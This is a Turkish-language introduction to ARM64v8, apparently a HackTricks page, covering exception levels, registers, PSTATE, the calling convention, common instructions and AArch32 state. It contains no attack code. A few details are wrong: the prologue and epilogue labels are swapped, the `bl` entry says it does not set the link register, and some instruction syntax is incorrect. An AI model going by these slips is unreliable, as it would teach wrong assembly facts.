# ARM64v8'e Giriş

{{#include ../../../banners/hacktricks-training.md}}


## **Exception Levels - EL (ARM64v8)**

ARMv8 mimarisinde Exception Levels (EL'ler) olarak bilinen yürütme seviyeleri, yürütme ortamının ayrıcalık seviyesini ve yeteneklerini tanımlar. EL0'dan EL3'e kadar değişen dört exception seviyesi vardır ve her biri farklı bir amaca hizmet eder:

1. **EL0 - Kullanıcı Modu**:
- En düşük ayrıcalıklı seviyedir ve normal uygulama kodunu yürütmek için kullanılır.
- EL0'da çalışan uygulamalar birbirlerinden ve sistem yazılımından izole edilir; bu da güvenliği ve kararlılığı artırır.
2. **EL1 - İşletim Sistemi Kernel Modu**:
- İşletim sistemi kernel'lerinin çoğu bu seviyede çalışır.
- EL1, EL0'dan daha fazla ayrıcalığa sahiptir ve sistem kaynaklarına erişebilir; ancak sistem bütünlüğünü korumak için bazı kısıtlamalar vardır. EL0'dan EL1'e `SVC` instruction ile geçilir.
3. **EL2 - Hypervisor Modu**:
- Bu seviye virtualization için kullanılır. EL2'de çalışan bir hypervisor, aynı fiziksel donanım üzerinde çalışan birden fazla işletim sistemini (her biri kendi EL1 seviyesinde) yönetebilir.
- EL2, virtualized ortamların izolasyonu ve kontrolü için özellikler sağlar.
- Bu nedenle Parallels gibi virtual machine uygulamaları, kernel extension'larına ihtiyaç duymadan EL2 ile etkileşim kurmak ve virtual machine'ler çalıştırmak için `hypervisor.framework` kullanabilir.
- EL1'den EL2'ye geçmek için `HVC` instruction kullanılır.
4. **EL3 - Secure Monitor Modu**:
- En ayrıcalıklı seviyedir ve genellikle secure boot ve trusted execution environment'lar için kullanılır.
- EL3, secure ve non-secure durumlar arasındaki erişimleri yönetebilir ve kontrol edebilir (secure boot, trusted OS vb.).
- macOS'ta KPP (Kernel Patch Protection) için kullanılıyordu, ancak artık kullanılmıyor.
- EL3 artık Apple tarafından kullanılmıyor.
- EL3'e geçiş genellikle `SMC` (Secure Monitor Call) instruction kullanılarak yapılır.

Bu seviyelerin kullanılması, kullanıcı uygulamalarından en ayrıcalıklı sistem yazılımına kadar sistemin farklı yönlerini yönetmek için yapılandırılmış ve güvenli bir yöntem sağlar. ARMv8'in ayrıcalık seviyelerine yaklaşımı, farklı sistem bileşenlerini etkili şekilde izole ederek sistemin güvenliğini ve dayanıklılığını artırır.

## **Registers (ARM64v8)**

ARM64'te `x0` ile `x30` arasında etiketlenmiş **31 genel amaçlı register** bulunur. Her biri **64-bit** (8-byte) değer saklayabilir. Yalnızca 32-bit değer gerektiren işlemler için aynı register'lara `w0` ile `w30` adları kullanılarak 32-bit modda erişilebilir.

1. **`x0`** ile **`x7`** - Bunlar genellikle scratch register olarak ve subroutine'lere parametre geçirmek için kullanılır.
- **`x0`** ayrıca bir function'ın return data'sını taşır
2. **`x8`** - Linux kernel'de `x8`, `svc` instruction için system call number olarak kullanılır. **macOS'ta kullanılan register x16'dır!**
3. **`x9`** ile **`x15`** - Genellikle local variable'lar için kullanılan diğer temporary register'lardır.
4. **`x16`** ve **`x17`** - **Intra-procedural Call Register'lar**. Immediate value'lar için temporary register'lardır. Ayrıca indirect function call'lar ve PLT (Procedure Linkage Table) stub'ları için kullanılırlar.
- **`x16`**, macOS'ta **`svc`** instruction için **system call number** olarak kullanılır.
5. **`x18`** - **Platform register**. Genel amaçlı register olarak kullanılabilir; ancak bazı platformlarda platforma özel kullanımlar için ayrılmıştır: Windows'ta mevcut thread environment block'a pointer veya **Linux kernel'de o anda yürütülen task structure'ını** göstermek için kullanılır.
6. **`x19`** ile **`x28`** - Bunlar callee-saved register'lardır. Bir function, caller'ı için bu register'ların değerlerini korumalıdır; bu nedenle stack'te saklanır ve caller'a dönmeden önce geri yüklenir.
7. **`x29`** - Stack frame'i takip etmek için kullanılan **frame pointer**. Bir function çağrıldığı için yeni bir stack frame oluşturulduğunda **`x29`** register'ı **stack'te saklanır** ve **yeni** frame pointer adresi (**`sp`** adresi) bu register'a **saklanır**.
- Bu register **genel amaçlı register** olarak da kullanılabilir; ancak genellikle **local variable**'lara referans olarak kullanılır.
8. **`x30`** veya **`lr`** - **Link register**. Bir `BL` (Branch with Link) veya `BLR` (Branch with Link to Register) instruction'ı çalıştırıldığında **`pc`** değerini bu register'a kaydederek **return address**'i tutar.
- Diğer herhangi bir register gibi kullanılabilir.
- Mevcut function yeni bir function çağıracaksa ve bu nedenle `lr`'yi overwrite edecekse, başlangıçta onu stack'te saklar; bu epilogue'dur (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> `fp` ve `lr`'yi sakla, alan oluştur ve yeni `fp`'yi al) ve sonunda geri yükler; bu da prologue'dur (`ldp x29, x30, [sp], #48; ret` -> `fp` ve `lr`'yi geri yükle ve return et).
9. **`sp`** - Stack'in tepesini takip etmek için kullanılan **stack pointer**.
- **`sp`** değeri her zaman en az bir **quadword** **alignment**'ında tutulmalıdır; aksi hâlde bir alignment exception oluşabilir.
10. **`pc`** - Bir sonraki instruction'ı gösteren **program counter**. Bu register yalnızca exception oluşturma, exception return ve branch işlemleri aracılığıyla güncellenebilir. Bu register'ı okuyabilen tek normal instruction'lar, **`pc`** adresini **`lr`**'ye (Link Register) kaydetmek için kullanılan branch with link instruction'larıdır (BL, BLR).
11. **`xzr`** - **Zero register**. 32-bit register biçiminde **`wzr`** olarak da adlandırılır. Sıfır değerini kolayca elde etmek (yaygın bir işlem) veya **`subs`** kullanarak karşılaştırma yapmak için kullanılabilir; örneğin **`subs XZR, Xn, #10`**, resulting data'yı hiçbir yerde saklamaz (**`xzr`** içine).

**`Wn`** register'ları, **`Xn`** register'larının **32-bit** sürümüdür.

> [!TIP]
> X0 - X18 arasındaki register'lar volatile'dır; bu, function call'lar ve interrupt'lar tarafından değerlerinin değiştirilebileceği anlamına gelir. Ancak X19 - X28 arasındaki register'lar non-volatile'dır; yani değerleri function call'lar arasında korunmalıdır ("callee saved").

### SIMD ve Floating-Point Register'ları

Ayrıca optimized single instruction multiple data (SIMD) işlemlerinde ve floating-point arithmetic gerçekleştirmek için kullanılabilen **128-bit uzunluğunda 32 register** daha vardır. Bunlara Vn register'ları denir; ancak **64**-bit, **32**-bit, **16**-bit ve **8**-bit olarak da çalışabilirler ve bu durumda **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** ve **`Bn`** olarak adlandırılırlar.

### System Register'lar

**Processor davranışını** **izlemek** ve **kontrol etmek** için kullanılan, special-purpose register'lar (SPR'ler) olarak da adlandırılan **yüzlerce system register** vardır.\
Bunlar yalnızca özel instruction'lar olan **`mrs`** ve **`msr`** kullanılarak okunabilir veya ayarlanabilir.

**`TPIDR_EL0`** ve **`TPIDDR_EL0`** special register'larına reverse engineering sırasında sıkça rastlanır. `EL0` suffix'i, register'a erişilebilecek **minimum exception** seviyesini belirtir (bu durumda EL0, normal programların çalıştığı normal exception (privilege) seviyesidir).\
Bunlar genellikle **thread-local storage** memory region'ının **base address**'ini saklamak için kullanılır. Genellikle ilki EL0'da çalışan programlar tarafından okunabilir ve yazılabilir; ikincisi ise EL0'dan okunabilir ve EL1'den (kernel gibi) yazılabilir.

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

**PSTATE**, çeşitli process bileşenlerini işletim sistemi tarafından görülebilen **`SPSR_ELx`** special register'ında serialize edilmiş şekilde içerir; burada X, tetiklenen exception'ın **permission** **level**'ıdır (bu, exception sona erdiğinde process state'in geri yüklenmesini sağlar).\
Erişilebilen field'lar şunlardır:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- **`N`**, **`Z`**, **`C`** ve **`V`** condition flag'leri:
- **`N`**, işlemin negatif bir sonuç ürettiği anlamına gelir
- **`Z`**, işlemin sıfır ürettiği anlamına gelir
- **`C`**, işlemin carry oluşturduğu anlamına gelir
- **`V`**, işlemin signed overflow ürettiği anlamına gelir:
- İki pozitif sayının toplamı negatif bir sonuç üretir.
- İki negatif sayının toplamı pozitif bir sonuç üretir.
- Subtraction işleminde, büyük bir negatif sayı daha küçük bir pozitif sayıdan (veya tersi) çıkarıldığında ve sonuç verilen bit size aralığında temsil edilemediğinde.
- Processor işlemin signed veya unsigned olduğunu doğrudan bilemez; bu nedenle işlemlerde C ve V'yi kontrol eder ve signed veya unsigned olması durumunda carry oluşup oluşmadığını belirtir.

> [!WARNING]
> Tüm instruction'lar bu flag'leri güncellemez. **`CMP`** veya **`TST`** gibi bazıları günceller; **`ADDS`** gibi s suffix'ine sahip diğer instruction'lar da bunu yapar.

- Mevcut **register width (`nRW`) flag'i**: Flag 0 değerini taşıyorsa program devam ettirildiğinde AArch64 execution state'te çalışır.
- Mevcut **Exception Level** (**`EL`**): EL0'da çalışan normal bir program 0 değerine sahip olur
- **Single stepping** flag'i (**`SS`**): Debugger'lar tarafından, bir exception aracılığıyla **`SPSR_ELx`** içindeki SS flag'i 1'e ayarlanarak single step yapmak için kullanılır. Program bir step çalıştırır ve single step exception oluşturur.
- **Illegal exception** state flag'i (**`IL`**): Privileged software geçersiz bir exception level transferi gerçekleştirdiğinde bunu işaretlemek için kullanılır; bu flag 1'e ayarlanır ve processor illegal state exception tetikler.
- **`DAIF`** flag'leri: Bu flag'ler privileged bir programın belirli external exception'ları seçerek mask'lemesini sağlar.
- **`A`** değeri 1 ise **asynchronous abort**'lar tetiklenir. **`I`**, external hardware **Interrupt Requests**'lere (IRQ'lar) yanıt verilip verilmeyeceğini yapılandırır; F ise **Fast Interrupt Requests** (FIR'lar) ile ilgilidir.
- **Stack pointer select** flag'leri (**`SPS`**): EL1 ve üzeri seviyelerde çalışan privileged programlar, kendi stack pointer register'larını ve user-model olanı (örneğin `SP_EL1` ile `EL0` arasında) kullanmak arasında geçiş yapabilir. Bu geçiş **`SPSel`** special register'ına yazılarak gerçekleştirilir. Bu işlem EL0'dan yapılamaz.

## **Calling Convention (ARM64v8)**

ARM64 calling convention, bir function'ın **ilk sekiz parametresinin** **`x0`** ile **`x7`** arasındaki register'larda geçirilmesini belirtir. **Ek** parametreler **stack** üzerinde geçirilir. **Return** değeri **`x0`** register'ında, **128 bit uzunluğundaysa** ayrıca **`x1`** register'ında geçirilir. **`x19`** ile **`x30`** arasındaki register'lar ve **`sp`** register'ı function call'lar boyunca **korunmalıdır**.

Assembly'de bir function okurken **function prologue** ve **epilogue**'unu arayın. **Prologue** genellikle **frame pointer'ı (`x29`) kaydetmeyi**, **yeni bir frame pointer ayarlamayı** ve **stack alanı ayırmayı** içerir. **Epilogue** genellikle kaydedilen frame pointer'ı geri yüklemeyi ve function'dan **return** etmeyi içerir.

### Swift'te Calling Convention

Swift'in kendi **calling convention**'ı vardır ve [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) adresinde bulunabilir.

## **Common Instructions (ARM64v8)**

ARM64 instruction'ları genellikle **`opcode dst, src1, src2`** formatına sahiptir; burada **`opcode`**, gerçekleştirilecek işlemdir (`add`, `sub`, `mov` vb.), **`dst`**, sonucun saklanacağı **destination** register'ıdır ve **`src1`** ile **`src2`**, **source** register'larıdır. Source register'lar yerine immediate value'lar da kullanılabilir.

- **`mov`**: Bir **register**'daki değeri başka bir **register**'a **taşır**.
- Example: `mov x0, x1` — Bu, `x1`'deki değeri `x0`'a taşır.
- **`ldr`**: Bir değeri **memory**'den **register**'a **yükler**.
- Example: `ldr x0, [x1]` — `x1` tarafından gösterilen memory location'daki değeri `x0`'a yükler.
- **Offset mode**: Origin pointer'ı etkileyen bir offset şu şekilde belirtilir:
- `ldr x2, [x1, #8]`, bu işlem x1 + 8 değerini x2'ye yükler
- `ldr x2, [x0, x1, lsl #2]`, bu işlem x0 array'inden, x1 (index) \* 4 konumundaki bir object'i x2'ye yükler
- **Pre-indexed mode**: Hesaplamaları origin'e uygular, sonucu alır ve yeni origin'i origin'e kaydeder.
- `ldr x2, [x1, #8]!`, bu işlem `x1 + 8` değerini `x2`'ye yükler ve `x1`'e `x1 + 8` sonucunu kaydeder
- `str lr, [sp, #-4]!`, link register'ı sp'de saklar ve sp register'ını günceller
- **Post-index mode**: Önceki moda benzer; ancak memory address'e erişilir, ardından offset hesaplanır ve kaydedilir.
- `ldr x0, [x1], #8`, `x1`'i `x0`'a yükler ve x1'i `x1 + 8` ile günceller
- **PC-relative addressing**: Bu durumda yüklenecek address, PC register'ına göre hesaplanır
- `ldr x1, =_start`, `_start` symbol'ünün başladığı address'i mevcut PC'ye göre x1'e yükler.
- **`str`**: Bir **register**'daki değeri **memory**'ye **sakar**.
- Example: `str x0, [x1]` — `x0`'daki değeri `x1` tarafından gösterilen memory location'a saklar.
- **`ldp`**: **Load Pair of Registers**. Bu instruction, **ardışık memory** location'larından **iki register** yükler. Memory address genellikle başka bir register'daki değere offset eklenerek oluşturulur.
- Example: `ldp x0, x1, [x2]` — `x0` ve `x1`'i sırasıyla `x2` ve `x2 + 8` memory location'larından yükler.
- **`stp`**: **Store Pair of Registers**. Bu instruction, **ardışık memory** location'larına **iki register** saklar. Memory address genellikle başka bir register'daki değere offset eklenerek oluşturulur.
- Example: `stp x0, x1, [sp]` — `x0` ve `x1`'i sırasıyla `sp` ve `sp + 8` memory location'larına saklar.
- `stp x0, x1, [sp, #16]!` — `x0` ve `x1`'i sırasıyla `sp+16` ve `sp + 24` memory location'larına saklar ve `sp`'yi `sp+16` ile günceller.
- **`add`**: İki register'ın değerlerini **toplar** ve sonucu bir register'a saklar.
- Syntax: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Destination
- Xn2 -> Operand 1
- Xn3 | #imm -> Operand 2 (register veya immediate)
- \[shift #N | RRX] -> Bir shift gerçekleştirir veya RRX çağırır
- Example: `add x0, x1, x2` — `x1` ve `x2` değerlerini toplar ve sonucu `x0`'da saklar.
- `add x5, x5, #1, lsl #12` — Bu, 4096'ya eşittir (1'i 12 kez shifter) -> 1 0000 0000 0000 0000
- **`adds`** Bir `add` gerçekleştirir ve flag'leri günceller
- **`sub`**: İki register'ın değerlerini **çıkarır** ve sonucu bir register'a saklar.
- **`add`** **syntax**'ına bakın.
- Example: `sub x0, x1, x2` — `x2` değerini `x1`'den çıkarır ve sonucu `x0`'da saklar.
- **`subs`** `sub` gibidir, ancak flag'i günceller
- **`mul`**: **İki register** değerini **çarpar** ve sonucu bir register'a saklar.
- Example: `mul x0, x1, x2` — `x1` ve `x2` değerlerini çarpar ve sonucu `x0`'da saklar.
- **`div`**: Bir register'ın değerini diğeriyle **böler** ve sonucu bir register'a saklar.
- Example: `div x0, x1, x2` — `x1` değerini `x2`'ye böler ve sonucu `x0`'da saklar.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
- **Logical shift left**: Sondan 0'lar ekleyerek diğer bitleri ileri taşır (n kez 2 ile çarpma)
- **Logical shift right**: Başlangıca 1'ler ekleyerek diğer bitleri geriye taşır (unsigned durumda n kez 2'ye bölme)
- **Arithmetic shift right**: **`lsr`** gibidir; ancak en significant bit 1 ise 0 eklemek yerine **1'ler eklenir** (signed durumda n kez 2'ye bölme)
- **Rotate right**: **`lsr`** gibidir; ancak sağdan çıkarılan ne varsa sola eklenir
- **Rotate Right with Extend**: **`ror`** gibidir, ancak carry flag "en significant bit" olarak kullanılır. Carry flag bit 31'e, çıkarılan bit ise carry flag'e taşınır.
- **`bfm`**: **Bit Field Move**; bu işlemler bir değerden **`0...n` bit'lerini kopyalar** ve bunları **`m..m+n`** konumlarına yerleştirir. **`#s`**, **en soldaki bit** konumunu; **`#r`** ise sağa rotate miktarını belirtir.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Bir register'dan bitfield'ı kopyalar ve başka bir register'a kopyalar.
- **`BFI X1, X2, #3, #4`** X2'den 4 biti alır ve X1'in 3. bitinden başlayarak ekler
- **`BFXIL X1, X2, #3, #4`** X2'nin 3. bitinden dört bit çıkarır ve bunları X1'e kopyalar
- **`SBFIZ X1, X2, #3, #4`** X2'den 4 biti sign-extend eder ve sağ bitleri sıfırlayarak bit konumu 3'ten başlayarak X1'e ekler
- **`SBFX X1, X2, #3, #4`** X2'den bit 3'ten başlayan 4 biti çıkarır, sign-extend eder ve sonucu X1'e yerleştirir
- **`UBFIZ X1, X2, #3, #4`** X2'den 4 biti zero-extend eder ve sağ bitleri sıfırlayarak bit konumu 3'ten başlayarak X1'e ekler
- **`UBFX X1, X2, #3, #4`** X2'den bit 3'ten başlayan 4 biti çıkarır ve zero-extended sonucu X1'e yerleştirir.
- **Sign Extend To X:** Bir değer üzerinde işlem yapabilmek için değerinin işaretini (veya unsigned sürümünde yalnızca 0'lar ekleyerek) genişletir:
- **`SXTB X1, W2`** 64 bit'i doldurmak için bir byte'ın işaretini **W2'den X1'e** genişletir (`W2`, `X2`'nin yarısıdır)
- **`SXTH X1, W2`** 64 bit'i doldurmak için 16-bit bir sayının işaretini **W2'den X1'e** genişletir
- **`SXTW X1, W2`** 64 bit'i doldurmak için bir byte'ın işaretini **W2'den X1'e** genişletir
- **`UXTB X1, W2`** 64 bit'i doldurmak için **W2'den X1'e** bir byte'a 0'lar (unsigned) ekler
- **`extr`:** Belirtilen **birleştirilmiş register çifti** içinden bit'leri çıkarır.
- Example: `EXTR W3, W2, W1, #3` Bu işlem **W1+W2'yi birleştirir**, **W2'nin 3. bitinden W1'in 3. bitine kadar** olan kısmı alır ve W3'e saklar.
- **`cmp`**: İki register'ı **karşılaştırır** ve condition flag'lerini ayarlar. Destination register'ını zero register'a ayarlayan bir **`subs` alias'ıdır**. `m == n` olup olmadığını bilmek için kullanışlıdır.
- **`subs` ile aynı syntax'ı** destekler
- Example: `cmp x0, x1` — `x0` ve `x1` değerlerini karşılaştırır ve condition flag'lerini buna göre ayarlar.
- **`cmn`**: **Compare negative** operand. Bu durumda **`adds` alias'ıdır** ve aynı syntax'ı destekler. `m == -n` olup olmadığını bilmek için kullanışlıdır.
- **`ccmp`**: Conditional comparison; yalnızca önceki bir karşılaştırma doğruysa gerçekleştirilen ve nzcv bit'lerini özel olarak ayarlayan bir karşılaştırmadır.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> x1 != x2 ve x3 < x4 ise func'a atla
- Bunun nedeni **`ccmp`**'nin yalnızca **önceki `cmp`, `NE` ise** çalıştırılmasıdır; değilse `nzcv` bit'leri 0'a ayarlanır (bu da `blt` karşılaştırmasını sağlamaz).
- Bu işlem `ccmn` olarak da kullanılabilir (`cmp` ile `cmn` arasındaki fark gibi negatif sürüm).
- **`tst`**: Karşılaştırmadaki değerlerden herhangi ikisinin de 1 olup olmadığını kontrol eder (sonucu hiçbir yerde saklamadan ANDS gibi çalışır). Bir register'ı bir değerle kontrol etmek ve bu değerde belirtilen register bitlerinden herhangi birinin 1 olup olmadığını görmek için kullanışlıdır.
- Example: `tst X1, #7` X1'in son 3 bitinden herhangi birinin 1 olup olmadığını kontrol eder
- **`teq`**: Sonucu discard eden XOR işlemi
- **`b`**: Unconditional Branch
- Example: `b myFunction`
- Bunun link register'ını return address ile doldurmayacağını unutmayın (geri dönmesi gereken subroutine call'ları için uygun değildir)
- **`bl`**: Link ile **Branch**; bir **subroutine'i çağırmak** için kullanılır. **Return address'i `x30`'da** saklar.
- Example: `bl myFunction` — `myFunction` function'ını çağırır ve return address'i `x30`'da saklar.
- Bunun link register'ını return address ile doldurmayacağını unutmayın (geri dönmesi gereken subroutine call'ları için uygun değildir)
- **`blr`**: Register'a Link ile **Branch**; hedefi bir **register'da belirtilen** bir **subroutine'i çağırmak** için kullanılır. Return address'i `x30`'da saklar. (Bu
- Example: `blr x1` — Adresi `x1` içinde bulunan function'ı çağırır ve return address'i `x30`'da saklar.
- **`ret`**: Genellikle **`x30`** içindeki address'i kullanarak **subroutine'den return** eder.
- Example: `ret` — `x30` içindeki return address'i kullanarak mevcut subroutine'den return eder.
- **`b.<cond>`**: Conditional branch'ler
- **`b.eq`**: Önceki `cmp` instruction'ına göre **eşitse branch** yapar.
- Example: `b.eq label` — Önceki `cmp` instruction'ı iki eşit değer bulduysa `label`'a atlar.
- **`b.ne`**: **Eşit değilse Branch** yapar. Bu instruction, önceki bir comparison instruction tarafından ayarlanan condition flag'lerini kontrol eder; karşılaştırılan değerler eşit değilse bir label'a veya address'e branch yapar.
- Example: `cmp x0, x1` instruction'ından sonra `b.ne label` — `x0` ve `x1` değerleri eşit değilse `label`'a atlar.
- **`cbz`**: **Compare and Branch on Zero**. Bir register'ı sıfırla karşılaştırır; eşitse bir label'a veya address'e branch yapar.
- Example: `cbz x0, label` — `x0` değeri sıfırsa `label`'a atlar.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Bir register'ı sıfırla karşılaştırır; eşit değilse bir label'a veya address'e branch yapar.
- Example: `cbnz x0, label` — `x0` değeri sıfır değilse `label`'a atlar.
- **`tbnz`**: Bit'i test eder ve sıfır değilse branch yapar
- Example: `tbnz x0, #8, label`
- **`tbz`**: Bit'i test eder ve sıfırsa branch yapar
- Example: `tbz x0, #8, label`
- **Conditional select operations**: Davranışı conditional bit'lere göre değişen işlemlerdir.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Doğruysa X0 = X1, yanlışsa X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Doğruysa Xd = Xn, yanlışsa Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Doğruysa Xd = Xn + 1, yanlışsa Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Doğruysa Xd = Xn, yanlışsa Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Doğruysa Xd = NOT(Xn), yanlışsa Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Doğruysa Xd = Xn, yanlışsa Xd = - Xm
- `cneg Xd, Xn, cond` -> Doğruysa Xd = - Xn, yanlışsa Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Doğruysa Xd = 1, yanlışsa Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Doğruysa Xd = \<all 1>, yanlışsa Xd = 0
- **`adrp`**: Bir **symbol'ün page address**'ini hesaplar ve bir register'a saklar.
- Example: `adrp x0, symbol` — `symbol`'ün page address'ini hesaplar ve `x0`'da saklar.
- **`ldrsw`**: Memory'den signed **32-bit** bir değer **yükler** ve bunu 64 bit'e **sign-extend** eder. Yaygın SWITCH durumları için kullanılır.
- Example: `ldrsw x0, [x1]` — `x1` tarafından gösterilen memory location'dan signed 32-bit bir değer yükler, bunu 64 bit'e sign-extend eder ve `x0`'da saklar.
- **`stur`**: Başka bir register'dan alınan offset'i kullanarak bir **register değerini memory location'a saklar**.
- Example: `stur x0, [x1, #4]` — `x0` değerini, mevcut olarak `x1`'de bulunan address'ten 4 byte daha büyük olan memory address'ine saklar.
- **`svc`** : Bir **system call** gerçekleştirir. "Supervisor Call" anlamına gelir. Processor bu instruction'ı çalıştırdığında **user mode'dan kernel mode'a geçer** ve **kernel'in system call handling** kodunun bulunduğu memory'deki belirli bir konuma atlar.

- Example:

```armasm
mov x8, 93  ; Load the system call number for exit (93) into register x8.
mov x0, 0   ; Load the exit status code (0) into register x0.
svc 0       ; Make the system call.
```

### **Function Prologue**

1. **Link register'ı ve frame pointer'ı stack'e kaydetme**:
```armasm
stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
```
2. **Yeni frame pointer'ı ayarlayın**: `mov x29, sp` (mevcut function için yeni frame pointer'ı ayarlar)
3. **Local variable'lar için stack'te alan ayırın** (gerekliyse): `sub sp, sp, <size>` (burada `<size>`, gereken byte sayısıdır)

### **Function Epilogue**

1. **Local variable'ların alanını serbest bırakın** (alan ayrıldıysa): `add sp, sp, <size>`
2. **Link register'ı ve frame pointer'ı geri yükleyin**:
```armasm
ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
```
3. **Dönüş**: `ret` (link register içindeki adresi kullanarak kontrolü caller'a döndürür)

## ARM Common Memory Protections

{{#ref}}
../../../binary-exploitation/ios-exploiting/README.md
{{#endref}}

## AARCH32 Execution State

Armv8-A, 32-bit programların çalıştırılmasını destekler. **AArch32**, **iki instruction set**'ten biriyle çalışabilir: **`A32`** ve **`T32`**; bunlar arasında **`interworking`** aracılığıyla geçiş yapılabilir.\
**Privileged** 64-bit programlar, daha düşük yetkili 32-bit **exception level**'a bir exception level transfer gerçekleştirerek **32-bit programların çalıştırılmasını** planlayabilir.\
64-bit'ten 32-bit'e geçişin, exception level'ın düşürülmesiyle gerçekleştiğine dikkat edin (örneğin EL1'deki 64-bit bir programın EL0'da bir programı tetiklemesi). Bu işlem, **`AArch32`** process thread'i çalıştırılmaya hazır olduğunda **`SPSR_ELx`** özel register'ının **4. bitinin** **1** olarak ayarlanmasıyla gerçekleştirilir; `SPSR_ELx`'in geri kalanı ise **`AArch32`** programının CPSR'sini depolar. Ardından privileged process, processor'ın **`AArch32`**'e geçerek CPSR'ye bağlı olarak A32 veya T32'ye girmesi için **`ERET`** instruction'ını çağırır**.**

**`interworking`**, CPSR'nin J ve T bitleri kullanılarak gerçekleşir. `J=0` ve `T=0`, **`A32`** anlamına gelir; `J=0` ve `T=1` ise **T32** anlamına gelir. Bu, instruction set'in T32 olduğunu belirtmek için temel olarak **en düşük bitin 1 olarak ayarlanması** şeklinde ifade edilebilir.\
Bu işlem **interworking branch instructions** sırasında gerçekleştirilir; ancak PC destination register olarak ayarlandığında diğer instruction'larla da doğrudan gerçekleştirilebilir. Örnek:

Başka bir örnek:
```armasm
_start:
.code 32                ; Begin using A32
add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)

.code 16:
mov r0, #0
mov r0, #8
```
### Register'lar

16 adet 32-bit register vardır (r0-r15). **r0'dan r14'e kadar** olanlar **herhangi bir işlem** için kullanılabilir; ancak bazıları genellikle ayrılmıştır:

- **`r15`**: Program sayacı (her zaman). Bir sonraki instruction'ın adresini içerir. A32'de mevcut adres + 8, T32'de mevcut adres + 4.
- **`r11`**: Frame Pointer
- **`r12`**: Prosedür içi çağrı register'ı
- **`r13`**: Stack Pointer (Stack'in her zaman 16-byte hizalı olduğuna dikkat edin)
- **`r14`**: Link Register

Ayrıca register'lar, register değerlerini depolayan **`banked registries`** tarafından yedeklenir. Bu yapı, exception handling ve ayrıcalıklı işlemler sırasında **hızlı context switching** yapılmasını sağlar ve her seferinde register'ları manuel olarak kaydetme ve geri yükleme ihtiyacını ortadan kaldırır.\
Bu işlem, işlemci modunun exception'ın yönlendirildiği **`SPSR`** register'ına **`CPSR`** içindeki işlemci durumunun kaydedilmesiyle yapılır. Exception'dan dönüşte ise **`CPSR`**, **`SPSR`**'dan geri yüklenir.

### CPSR - Current Program Status Register

AArch32'de CPSR, AArch64'teki **`PSTATE`**'e benzer şekilde çalışır ve execution'ın daha sonra geri yüklenmesi için bir exception alındığında **`SPSR_ELx`** içinde de saklanır:

<figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>

Alanlar birkaç gruba ayrılır:

- Application Program Status Register (APSR): Arithmetic flag'leri; EL0'dan erişilebilir
- Execution State Registers: Process davranışı (OS tarafından yönetilir).

#### Application Program Status Register (APSR)

- **`N`**, **`Z`**, **`C`**, **`V`** flag'leri (AArch64'tekiyle aynı)
- **`Q`** flag'i: Specialized saturating arithmetic instruction'larının execution'ı sırasında **integer saturation gerçekleştiğinde** 1 olarak ayarlanır. **`1`** olarak ayarlandıktan sonra manuel olarak 0 yapılana kadar değerini korur. Ayrıca değerini implicit olarak kontrol eden herhangi bir instruction yoktur; değer manuel olarak okunmalıdır.
- **`GE`** (Greater than or equal) flag'leri: "parallel add" ve "parallel subtract" gibi SIMD (Single Instruction, Multiple Data) işlemlerinde kullanılır. Bu işlemler, tek bir instruction içinde birden fazla data noktasının işlenmesini sağlar.

Örneğin **`UADD8`** instruction'ı, iki adet 32-bit operand'dan **dört byte çiftini** paralel olarak toplar ve sonuçları bir 32-bit register'a kaydeder. Ardından bu sonuçlara göre **APSR içindeki `GE` flag'lerini** ayarlar. Her GE flag'i byte toplamalarından birine karşılık gelir ve ilgili byte çiftinin toplamasında **overflow gerçekleşip gerçekleşmediğini** belirtir.

**`SEL`** instruction'ı, koşullu işlemler gerçekleştirmek için bu GE flag'lerini kullanır.

#### Execution State Registers

- **`J`** ve **`T`** bit'leri: **`J`** 0 olmalıdır; **`T`** 0 ise A32 instruction set'i, 1 ise T32 kullanılır.
- **IT Block State Register** (`ITSTATE`): Bunlar 10-15 ve 25-26 bit'leridir. **`IT`** prefix'iyle başlayan bir grup içindeki instruction'ların koşullarını depolarlar.
- **`E`** bit'i: **endianness**'i belirtir.
- **Mode and Exception Mask Bits** (0-4): Mevcut execution state'i belirler. 5. bit, programın 32-bit (1) veya 64-bit (0) olarak çalışıp çalışmadığını belirtir. Diğer 4 bit ise **mevcut kullanılan exception mode**'unu gösterir (bir exception meydana geldiğinde ve işlenirken). Ayarlanan sayı, bu exception işlenirken başka bir exception tetiklenmesi durumundaki **mevcut priority**'yi belirtir.

<figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>

